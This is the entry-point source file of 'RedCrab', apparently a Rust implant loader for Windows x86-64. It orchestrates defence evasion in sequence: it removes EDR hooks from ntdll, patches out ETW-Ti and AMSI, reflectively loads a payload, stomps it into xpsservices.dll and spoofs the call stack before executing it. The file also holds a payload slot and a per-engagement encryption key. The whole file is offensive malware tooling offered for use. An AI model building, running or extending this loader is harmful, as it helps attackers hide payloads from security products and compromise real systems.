// main.rs — RedCrab entry point
// Init order: unhook → blind ETW/AMSI → load PE → stomp → sleep loop

#![no_std]
#![no_main]
#![feature(naked_functions)]
#![cfg(all(target_arch = "x86_64", target_os = "windows"))]
#![allow(non_snake_case, unused)]

mod defs;
mod utils;
mod syscall;
mod loader;
mod stomp;
mod spoof;
mod sleep;
mod etw_patch;
mod unhook;

use core::panic::PanicInfo;

// ── Replace per engagement ────────────────────────────────────────────────────
// 32 random bytes — regenerate before every build
const SLEEP_KEY: &[u8] = &[
    0x4B,0x72,0x79,0x70,0x74,0x6F,0x4B,0x65,0x79,0x21,0x40,0x23,0x24,0x25,0x5E,0x26,
    0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,0x13,0x37,0xC0,0xDE,0xFF,0xFE,0x00,0x01,
];

// Drop your shellcode / PE bytes here
const PAYLOAD: &[u8] = &[0xCC]; // INT3 placeholder

#[no_mangle]
pub extern "C" fn main() -> i32 {
    unsafe {
        // Phase 0: Remove all EDR hooks from ntdll .text
        unhook::unhook_ntdll();

        // Phase 1: Kill ETW-Ti + AMSI (6 patch sites)
        let _patches = etw_patch::apply_all_blinds();

        // Phase 2: Reflective PE load
        let mapped = match loader::map_pe(PAYLOAD) {
            Ok(m)  => m,
            Err(_) => return 1,
        };

        // Phase 3: Module stomp (move payload into xpsservices.dll .text)
        let stomped = stomp::stomp(
            &[], &[], &[],  // uses built-in DECOY_NAME_W
            PAYLOAD,
        );

        // Phase 4: Spoof call stack + jump to entry
        let entry = if let Some(ref s) = stomped {
            s.entry
        } else {
            mapped.base.add(mapped.entry_rva as usize)
        };

        spoof::spoof_and_call(entry, core::ptr::null_mut());
    }
    0
}

#[panic_handler]
fn panic(_: &PanicInfo) -> ! { loop {} }
